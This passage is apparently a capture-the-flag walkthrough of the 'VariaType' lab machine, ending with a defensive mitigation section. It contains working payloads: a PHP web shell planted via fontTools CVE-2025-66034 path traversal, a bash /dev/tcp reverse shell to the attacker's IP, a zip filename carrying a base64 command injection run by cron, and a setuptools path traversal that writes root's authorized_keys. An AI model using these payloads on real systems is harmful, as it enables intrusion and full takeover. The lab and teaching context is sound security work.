&#x20;           if sha1 == '615e621dce970c2c1c16d2a1e26c12658e3669b3':

&#x20;               print('  ✓ MATCH! This is the credentials file!')

"

Raw tree data (hex):

747265652033360031303036343420617574682e70687000b328305f0e85c2b97a7e2a94978ae20f16db75e8

==================================================

Parsed tree object:

==================================================

Header: tree 36

File: auth.php

&#x20; Mode: 100644

&#x20; SHA1: b328305f0e85c2b97a7e2a94978ae20f16db75e8

&#x20; *** THIS IS THE AUTH.PHP BLOB ***

&#x20; Blob hash: b328305f0e85c2b97a7e2a94978ae20f16db75e8

&#x20; Expected blob: 615e621dce970c2c1c16d2a1e26c12658e3669b3
```

- 🔍 *Interesting! The tree shows a different blob hash than what we expected! The actual hash from the tree is b328305f0e85c2b97a7e2a94978ae20f16db75e8, not 615e621.... This means the auth.php content in this commit is different from what was shown in the git diff earlier.*

- 🔍 *Lets download the correct blob*

```bash
curl -o b3/28305f0e85c2b97a7e2a94978ae20f16db75e8 \\

&#x20;    http://portal.variatype.htb/.git/objects/b3/28305f0e85c2b97a7e2a94978ae20f16db75e8

┌──(root㉿fsocity)-[/home/…/VariaType/portal_dump/.git/objects]

└─# ls

00  50  6f  75  b3  c6  info
```

- 🔍 *Okay now lets decompress it*

```bash
python3 -c "

import zlib, sys

try:

&#x20;   with open('$file', 'rb') as f:

&#x20;       # Git objects are zlib compressed

&#x20;       data = zlib.decompress(f.read())

&#x20;       if b'gitbot' in data:

&#x20;           print('\\n*** FOUND DATA IN: $dir/$file ***')

&#x20;           # Show the content, ignoring non-text characters

&#x20;           print(data.decode('utf-8', errors='ignore'))

except Exception:

&#x20;   pass

" 2>/dev/null

&#x20;       done

&#x20;       cd ..

&#x20;   fi

done

*** FOUND DATA IN: 75/3b5f5957f2020480a19bf29a0ebc80267a4a3d ***

commit 259tree c6ea13ef05d96cf3f35f62f87df24ade29d1d6b4

parent 5030e791b764cb2a50fcb3e2279fea9737444870

author Dev Team [dev@variatype.htb](mailto:dev@variatype.htb) 1764968373 -0500

committer Dev Team [dev@variatype.htb](mailto:dev@variatype.htb) 1764968373 -0500

fix: add gitbot user for automated validation pipeline

*** FOUND DATA IN: b3/28305f0e85c2b97a7e2a94978ae20f16db75e8 ***

blob 75<?php

session_start();

$USERS = [

&#x20;   **'gitbot' => 'G1tB0t_Acc3ss_2025!'**

];
```

- 🔍 *got creds!*

- 🔍 *When logged in into the internal portal, there was nothing. it just checks and can download the fonts that were generated by the original font tool site. (a rabbit hole!)*

- 🔍 *As we have captured the intercepted request for the upload of desingspace and ttf files, there is a known vulnerability The application was using fontTools to process these files.*

- 🔍 *Research revealed CVE-2025-66034, a critical vulnerability in fontTools.varLib affecting versions 4.33.0 to before 4.60.2.*

```text
&#x20;[!] CVE-2025-66034 -

&#x09;The vulnerability had two components:

&#x09;1.Path Traversal: The filename attribute in <variable-fonts> wasn't sanitized, allowing ../../../../ sequences

&#x09;2.XML Injection: CDATA sections in <labelname> elements allowed injecting arbitrary content
```

- 🔍 *The CDATA section allows us to use php scripts inside the XML <labelname> attribute.*

- 🔍 *Exploitation Path :-*

```text
&#x09;[$] Will create a python script that will generate .ttf files for us

&#x09;[$]  then will create a malicious designspace file which contains, CDATA section, 

&#x09;[$] Will upload it to the target 

&#x09;[$] will get the shell!

(note:- one more thing about the found vulnerability is, we can create a file at a specific location. and then later we can use it to apply shell commands via URL)

\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```

## Step 2 - Initial Foothold-

- 🔍 *Lets First Create a Python script that will generate .ttf files for us*

```text
#!/usr/bin/env python3

import os

from fontTools.fontBuilder import FontBuilder

from fontTools.pens.ttGlyphPen import TTGlyphPen

def create_source_font(filename, weight=400):

&#x20;   fb = FontBuilder(unitsPerEm=1000, isTTF=True)

&#x20;   fb.setupGlyphOrder([".notdef"])

&#x20;   fb.setupCharacterMap({})

&#x20;   

&#x20;   pen = TTGlyphPen(None)

&#x20;   pen.moveTo((0, 0))

&#x20;   pen.lineTo((500, 0))

&#x20;   pen.lineTo((500, 500))

&#x20;   pen.lineTo((0, 500))

&#x20;   pen.closePath()

&#x20;   

&#x20;   fb.setupGlyf({".notdef": pen.glyph()})

&#x20;   fb.setupHorizontalMetrics({".notdef": (500, 0)})

&#x20;   fb.setupHorizontalHeader(ascent=800, descent=-200)

&#x20;   fb.setupOS2(usWeightClass=weight)

&#x20;   fb.setupPost()

&#x20;   fb.setupNameTable({"familyName": "Test", "styleName": f"Weight{weight}"})

&#x20;   fb.save(filename)

if __name__ == '__main__':

&#x20;   os.chdir(os.path.dirname(os.path.abspath(__file__)))

&#x20;   create_source_font("source-light.ttf", weight=100)

&#x20;   create_source_font("source-regular.ttf", weight=400)
```

- 🔍 *Run this script and you'll able to see some, source-regular.ttf & source-light.ttf files*

- 🔍 *Now Lets Create our malicious.designspace file*

```text
<?xml version='1.0' encoding='UTF-8'?>

<designspace format="5.0">

&#x20;   <axes>

&#x20;       <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">

&#x20;           <labelname xml:lang="en">**<![CDATA[<?php system($_GET['cmd']);** ?>]]></labelname>

&#x20;       </axis>

&#x20;   </axes>

&#x20;   <sources>

&#x20;       <source filename="source-light.ttf" name="Light">

&#x20;           <location>

&#x20;               <dimension name="Weight" xvalue="100"/>

&#x20;           </location>

&#x20;       </source>

&#x20;       <source filename="source-regular.ttf" name="Regular">

&#x20;           <location>

&#x20;               <dimension name="Weight" xvalue="400"/>

&#x20;           </location>

&#x20;       </source>

&#x20;   </sources>

&#x20;   <variable-fonts>

&#x20;       <variable-font name="MaliciousFont" filename=**"../../../../../../../var/www/portal.variatype.htb/public/files/shell.php"**>

&#x20;           <axis-subsets>

&#x20;               <axis-subset name="Weight"/>

&#x20;           </axis-subsets>

&#x20;       </variable-font>

&#x20;   </variable-fonts>

</designspace>
```

- 🔍 *Look above, the specified location and the CDATA sections are properly written and are good to go!*

```text
(note:- if you're thinking of uploading these files via web, then it's gonna cause errors and it will only take 1/2 ttf file, but to succeed the exploitation we need both the files to be uploaded!)
```

- 🔍 *lets use curl to upload*

```bash
curl -v -X POST http://variatype.htb/tools/variable-font-generator/process \\

&#x20; -F "designspace=@malicious.designspace" \\

&#x20; -F "masters=@source-light.ttf" \\

&#x20; -F "masters=@source-regular.ttf" \\

&#x20; -H "Expect:"
```

- 🔍 *Now test if we can Write cmd commands in the URL*

```bash
curl -s "http://portal.variatype.htb/files/shell.php?cmd=id"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- 🔍 *perfect!, now lets just get the shell*

- 🔍 *start a listener*

```text
nc -lvnp 4444
```

- 🔍 *upload the rev shell payload*

```bash
curl -s "http://portal.variatype.htb/files/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.****%2F4444%200%3E%261%27"

(note:- change ip)
```

- 🔍 *Shell!*

```text
nc -lvnp 4444

listening on [any] 4444 ...

connect to [10.10.14.67] from (UNKNOWN) [10.129.9.74] 35860

bash: cannot set terminal process group (3365): Inappropriate ioctl for device

bash: no job control in this shell

www-data@variatype:~/portal.variatype.htb/public/files$
```

- 🔍 *Got the shell*

- 🔍 *Now while enumerating i saw a pspy output, and it showed me that there is a CRON job running in the background!*

- 🔍 *Cron jobs are nothing but some scheduled task that runs for system  maintenance or logs after a specific interval of time.*

- 🔍 *In our case there is a script "/home/steve/bin/process_client_submissions.sh", which automatically runs after a period of time.*

```text
&#x09;[^] Attack path -

&#x09;	[$] will create a python script, which will create a zip file containing a rev shell base64 encoded payload 

&#x09;	[$] will share it to target

&#x09;	[$] when the CRON jobs runs, and the zip file is being extracted, it runs the payload!
```

- 🔍 *Okay So lets create the python scritp*

```text
#!/usr/bin/env python3

import zipfile

import base64

import os

rev_shell = "bash -i >& /dev/tcp/10.10.14.****/4445 0>&1"

payload = base64.b64encode(rev_shell.encode()).decode()

exploit_filename = f'$(echo {payload}|base64 -d|bash).ttf'

with zipfile.ZipFile('exploit.zip', 'w') as zipf:

&#x20;   zipf.writestr(exploit_filename, "This file will execute a reverse shell when extracted")

print(f"[+] Created exploit.zip with filename: {exploit_filename}")

print(f"[+] Payload: {rev_shell}")
```

- 🔍 *run it, it will create a zip file.*

- 🔍 *send it to target via-->*

```bash
curl http://YOUR_IP:8000/exploit.zip -o /var/www/portal.variatype.htb/public/files/exploit.zip

&#x20;
```

- 🔍 *Setup a listener, and wait for 1 to 2 minutes, to let the CRON job hit*

```text
nc -lvnp 4444

listening on [any] 4444 ...

connect to [10.10.14.67] from (UNKNOWN) [10.129.9.74] 34090

bash: cannot set terminal process group (4529): Inappropriate ioctl for device

bash: no job control in this shell

steve@variatype:/tmp/ffarchive-4530-1$
```

- 🔍 *got steve?*

- 🔍 *get user flag!*

```text
\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```

## Step 3 - Privilege Escalation

- 🔍 *lets check steve's privileges*

```text
steve@variatype:/tmp/ffarchive-3775-1$ sudo -l

sudo -l

Matching Defaults entries for steve on variatype:

&#x20;   env_reset, mail_badpass,

&#x20;   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,

&#x20;   use_pty

User steve may run the following commands on variatype:

&#x20;   (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

- 🔍 *So steve can run python3 and install_validator.py as root*

- 🔍 *i have analyzed the file-->*

```text
&#x09;Vulnerability Analysis:-

&#x09;The script used setuptools.package_index.PackageIndex.download() which has a vulnerability:

&#x09;It doesn't sanitize the filename portion of the URL

&#x09;Path traversal sequences (../) in the URL path can write files outside the intended directory

&#x09;The script runs as root via sudo

&#x09;However, there were two protections:

&#x09;1.URL length check (can't have too many / characters)

&#x09;2.PackageIndex requires an #egg=name-version suffix for Python packages
```

- 🔍 *Since we have sudo access to run the install_validator.py script as root, we can use it to add our SSH key to root's authorized_keys for persistent access.*

- 🔍 *Lets first generate our SSH keys*

```bash
ssh-keygen -t ed25519 -f /tmp/rootkey -N ""

mkdir -p /tmp/serve

cp /tmp/rootkey.pub /tmp/serve/authorized_keys
```

- 🔍 *Create a Custom HTTP server which will serve our keys!*

```text
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):

&#x20;   def do_GET(self):

&#x20;       with open('authorized_keys', 'rb') as f:

&#x20;           data = f.read()

&#x20;       self.send_response(200)

&#x20;       self.send_header('Content-Type', 'text/plain')

&#x20;       self.send_header('Content-Length', len(data))

&#x20;       self.end_headers()

&#x20;       self.wfile.write(data)

HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
```

- 🔍 *run the server*

- 🔍 *now on steve, run the validator module*

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \\

&#x20; "http://YOUR_IP:8888/%2Froot%2F.ssh%2Fauthorized_keys"

2026-03-20 02:11:33,769 [INFO] Attempting to install plugin from: http://10.10.14.**:8888/%2Froot%2F.ssh%2Fauthorized_keys

2026-03-20 02:11:33,777 [INFO] Downloading http://10.10.14.**:8888/%2Froot%2F.ssh%2Fauthorized_keys

2026-03-20 02:11:36,463 [INFO] Plugin installed at: /root/.ssh/authorized_keys

[+] Plugin installed successfully.
```

- 🔍 *Now we can access the root from our machine with*

```bash
ssh -i /tmp/rootkey root@10.129.9.74

The authenticity of host '10.129.9.74 (10.129.9.74)' can't be established.

ED25519 key fingerprint is SHA256:0Wqe+nNeYlUwY+F669ywmS9kPUMYXqJh5xxCxwyCapI.

This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '10.129.9.74' (ED25519) to the list of known hosts.

Linux variatype 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64

The programs included with the Debian GNU/Linux system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent

permitted by applicable law.

Last login: Fri Mar 20 02:14:34 2026 from 10.10.14.67

root@variatype:~# cat /root/root.txt

3accbc651e835f15360e76cd75c6f567
```

- 🔍 *PAWNED!!!! EASyy!!*

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Security Assessment Blueprint**
> Below is the post-exploitation blueprint analyzing every vulnerability and structural misconfiguration exploited in the VariaType system. Each vulnerability is mapped to its core risk, threat impact, and practical defensive remediation strategies.

### 🔴 Exposed Git Directory and Credential Exposure
> [!WARNING]
> **Vulnerability Profile:**
> The web service exposed its version control directory (`.git`) to public access. An attacker recovered the commit history and parsed historical compressed repository blobs (`b328305f0e85c2b97a7e2a94978ae20f16db75e8`), retrieving automated pipeline credentials (`gitbot` : `G1tB0t_Acc3ss_2025!`) from the version-controlled `auth.php` script.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Public Git folders expose source code, configuration details, database schemas, and hardcoded authentication secrets. Leakage of automated service credentials gives attackers potential persistent access to APIs, portals, and system integration points.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Configure Nginx and other web servers to explicitly deny access to hidden files (`.git/`, `.env`, etc.) by returning a `403 Forbidden` status. Implement automated scans (using tools like Trufflehog or GitGuardian) in CI/CD pipelines to prevent secrets from being committed.
> - **Detection:** Set up log alerts for requests attempting to access files starting with `/.git/` and monitor unauthorized access attempts on static authentication pages.

### 🔴 XML CDATA Injection & Path Traversal in fontTools (CVE-2025-66034)
> [!WARNING]
> **Vulnerability Profile:**
> The application compiled font designs using a vulnerable version of `fontTools.varLib`. The XML-based `.designspace` file configuration failed to sanitize path values inside the `<variable-font>` element's `filename` attribute, while evaluating inline CDATA block vectors inside `<labelname>` tags. This allowed writing a PHP shell to the web-accessible directory.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Path traversal inside file compilation structures lets attackers bypass upload directory isolation. Combined with XML injection, attackers can write arbitrary code contents, leading to Remote Code Execution (RCE) as the web daemon user.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Upgrade `fontTools` to version 4.60.2 or higher. Ensure all user-supplied files are compiled inside sandboxed directories, and sanitize path values to remove traversal strings (`../`).
> - **Detection:** Monitor HTTP file upload points for files containing XML schema declarations (`<?xml`), CDATA wrapper tags (`<![CDATA[`), or PHP executable symbols (`<?php`).

### 🔴 Wildcard Extraction Filename Command Injection
> [!WARNING]
> **Vulnerability Profile:**
> The background cron job executing `/home/steve/bin/process_client_submissions.sh` extracted incoming client archive files using a wildcard extraction command. This command parsed filenames literally, causing the shell to execute command segments embedded directly inside a file name (e.g. `$(echo payload | base64 -d | bash).ttf`).

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Command injection in background automated scripts allows a lower-privileged user to immediately hijack user contexts running scheduled jobs.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Avoid invoking external shell commands for file actions. Use internal programming APIs (e.g., Python's built-in `zipfile` module) to process archives, and strip special shell characters (such as `$`, `(`, `)`, `;`, `&`) from filenames before processing.
> - **Detection:** Track execution monitors (e.g., Audited, Sysmon) for parent shells (like `unzip`) spawning child shell processes (such as `bash` or `sh`) from non-interactive system users.

### 🔴 Path Traversal in setuptools PackageIndex (CVE-2025-47273)
> [!WARNING]
> **Vulnerability Profile:**
> The sudo configuration allowed user `steve` to execute `/opt/font-tools/install_validator.py` as root without a password. The script used a vulnerable version of `setuptools.package_index.PackageIndex` to download package resources. The library failed to validate url-encoded paths, allowing file-writes to arbitrary target paths via traversal parameters (e.g., writing the public key to `/root/.ssh/authorized_keys`).

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Insecure sudo permissions combined with library path traversal allows complete system takeover and local privilege escalation to root.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Update `setuptools` to a secure version. Restrict wildcard parameters in `sudoers` definitions, and ensure internal validator scripts enforce hardcoded paths and validate input strings before passing them to the package installer.
> - **Detection:** Log and alert on all executions of `sudo` calling Python installer scripts with external URL arguments. Monitor changes to `/root/.ssh/authorized_keys`.

